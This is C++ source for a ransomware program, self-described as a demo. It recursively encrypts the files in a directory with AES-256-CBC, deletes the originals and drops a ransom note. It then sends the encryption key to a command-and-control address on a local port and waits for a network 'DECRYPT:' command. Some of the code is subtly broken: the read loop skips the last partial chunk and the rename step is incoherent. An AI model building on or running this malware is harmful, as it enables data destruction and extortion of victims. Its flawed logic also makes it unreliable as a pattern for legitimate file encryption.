#include <openssl/evp.h>
#include <openssl/rand.h>
#include <boost/asio.hpp>
#include <filesystem>
#include <fstream>
#include <iostream>

using namespace std;
namespace fs = std::filesystem;
using boost::asio::ip::tcp;

// Global AES-256 key and IV
unsigned char key[32];
unsigned char iv[16];

// Encrypt a file using AES-256-CBC and rename with .encrypted extension
bool encryptFile(const string& inputFile, const string& outputFile, const unsigned char* key, const unsigned char* iv) {
    ifstream inFile(inputFile, ios::binary);
    ofstream outFile(outputFile, ios::binary);
    if (!inFile || !outFile) {
        cerr << "Error opening files: " << inputFile << endl;
        return false;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    unsigned char inBuf[4096], outBuf[4096 + EVP_MAX_BLOCK_LENGTH];
    int outLen;
    cout << "Encrypting: " << inputFile << "..." << flush;
    while (inFile.read((char*)inBuf, sizeof(inBuf))) {
        int bytesRead = inFile.gcount();
        if (EVP_EncryptUpdate(ctx, outBuf, &outLen, inBuf, bytesRead) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        outFile.write((char*)outBuf, outLen);
    }

    if (EVP_EncryptFinal_ex(ctx, outBuf, &outLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    outFile.write((char*)outBuf, outLen);

    inFile.close();
    outFile.close();
    EVP_CIPHER_CTX_free(ctx);
    cout << " Done" << endl;
    remove(inputFile.c_str());
    if (rename((inputFile + ".encrypted").c_str(), outputFile.c_str()) != 0) {
        cerr << "Error renaming " << outputFile << endl;
        return false;
    }
    return true;
}

// Decrypt a file and restore original extension
bool decryptFile(const string& inputFile, const string& outputFile, const unsigned char* key, const unsigned char* iv) {
    ifstream inFile(inputFile, ios::binary);
    ofstream outFile(outputFile, ios::binary);
    if (!inFile || !outFile) {
        cerr << "Error opening files: " << inputFile << endl;
        return false;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    unsigned char inBuf[4096], outBuf[4096 + EVP_MAX_BLOCK_LENGTH];
    int outLen;
    cout << "Decrypting: " << inputFile << "..." << flush;
    while (inFile.read((char*)inBuf, sizeof(inBuf))) {
        int bytesRead = inFile.gcount();
        if (EVP_DecryptUpdate(ctx, outBuf, &outLen, inBuf, bytesRead) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        outFile.write((char*)outBuf, outLen);
    }

    if (EVP_DecryptFinal_ex(ctx, outBuf, &outLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    outFile.write((char*)outBuf, outLen);

    inFile.close();
    outFile.close();
    EVP_CIPHER_CTX_free(ctx);
    cout << " Done" << endl;
    remove(inputFile.c_str());
    return true;
}

// Create a ransom note
void createRansomNote(const string& directory) {
    string notePath = directory + "/RANSOM_NOTE.txt";
    ofstream note(notePath);
    if (note) {
        note << "Your files have been encrypted!\n";
        note << "Contact the C2 server for decryption.\n";
        note.close();
        cout << "Ransom note created: " << notePath << endl;
    }
}

// Recursively encrypt directory, changing extensions to .encrypted
void encryptDirectory(const string& directory, const unsigned char* key, const unsigned char* iv) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            string inputFile = entry.path().string();
            string outputFile = inputFile + ".encrypted";
            if (encryptFile(inputFile, outputFile, key, iv)) {
                cout << "Encrypted and renamed: " << inputFile << " to " << outputFile << endl;
            }
        }
    }
}

// Recursively decrypt directory, restoring original extensions
void decryptDirectory(const string& directory, const unsigned char* key, const unsigned char* iv) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file() && entry.path().extension() == ".encrypted") {
            string inputFile = entry.path().string();
            string outputFile = inputFile.substr(0, inputFile.size() - 10); // Remove .encrypted
            if (decryptFile(inputFile, outputFile, key, iv)) {
                cout << "Decrypted and restored: " << inputFile << " to " << outputFile << endl;
            }
        }
    }
}

int main() {
    // Generate random AES-256 key and IV
    RAND_bytes(key, 32);
    RAND_bytes(iv, 16);

    // Target directory
    string targetDir = "/home/unknown/test_ransomware";

    // Encrypt files recursively
    cout << "Starting encryption process..." << endl;
    encryptDirectory(targetDir, key, iv);
    createRansomNote(targetDir);

    // Send key to C2 server
    try {
        boost::asio::io_context io_context;
        tcp::socket socket(io_context);
        socket.connect(tcp::endpoint(boost::asio::ip::address::from_string("127.0.0.1"), 8080));
        socket.write_some(boost::asio::buffer(key, 32));
        socket.close();
        cout << "Key sent to C2 server" << endl;
    } catch (std::exception& e) {
        cerr << "C2 connection error: " << e.what() << endl;
    }

    // Listen for decryption command
    try {
        boost::asio::io_context io_context;
        tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), 8081));
        cout << "Waiting for decryption command..." << endl;
        while (true) {
            tcp::socket socket(io_context);
            acceptor.accept(socket);
            char buffer[1024];
            boost::system::error_code error;
            size_t len = socket.read_some(boost::asio::buffer(buffer, 1024), error);
            if (!error) {
                string command(buffer, len);
                if (command.find("DECRYPT:") == 0) {
                    cout << "Received decryption command. Starting decryption..." << endl;
                    decryptDirectory(targetDir, key, iv);
                    cout << "Decryption complete" << endl;
                    break;
                }
            }
            socket.close();
        }
    } catch (std::exception& e) {
        cerr << "Decrypt listener error: " << e.what() << endl;
    }

    cout << "Ransomware demo complete" << endl;
    return 0;
}